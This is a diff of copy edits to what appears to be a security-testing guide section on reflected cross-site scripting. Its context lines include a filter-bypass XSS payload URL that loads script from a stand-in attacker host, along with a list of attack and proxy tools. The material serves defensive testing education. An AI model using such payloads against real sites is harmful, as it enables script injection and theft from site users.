@@ -165,7 +165,7 @@ Now suppose that developers of the target site implemented the following code to
 Decoupling the above regular expression:
 
 1. Check for a `<script`
-2. Check for a " " (white space)
+2. Check for a " " (whitespace)
 3. Any character but the character `>` for one or more occurrences
 4. Check for a `src`
 
@@ -175,7 +175,7 @@ This is useful for filtering expressions like `<script src="http://attacker/xss.
 http://example/?var=<SCRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>
 ```
 
-This will exploit the reflected cross site scripting vulnerability shown before, executing the JavaScript code stored on the attacker's web server as if it was originating from the victim web site, `http://example/`.
+This will exploit the reflected cross site scripting vulnerability shown before, executing the JavaScript code stored on the attacker's web server as if it was originating from the victim site, `http://example/`.
 
 #### Example 7: HTTP Parameter Pollution (HPP)
 
@@ -207,7 +207,7 @@ If source code is available (white-box testing), all variables received from use
 - [XSS-Proxy](http://xss-proxy.sourceforge.net/) is an advanced Cross-Site-Scripting (XSS) attack tool.
 - [ratproxy](https://code.google.com/archive/p/ratproxy/) is a semi-automated, largely passive web application security audit tool, optimized for an accurate and sensitive detection, and automatic annotation, of potential problems and security-relevant design patterns based on the observation of existing, user-initiated traffic in complex web 2.0 environments.
 - [Burp Proxy](https://portswigger.net/burp/) is an interactive HTTP/S proxy server for attacking and testing web applications.
-- [OWASP Zed Attack Proxy (ZAP)](https://www.zaproxy.org) is an interactive HTTP/S proxy server for attacking and testing web applications with a built-in scanner.
+- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org) is an interactive HTTP/S proxy server for attacking and testing web applications with a built-in scanner.
 
 ## References
 
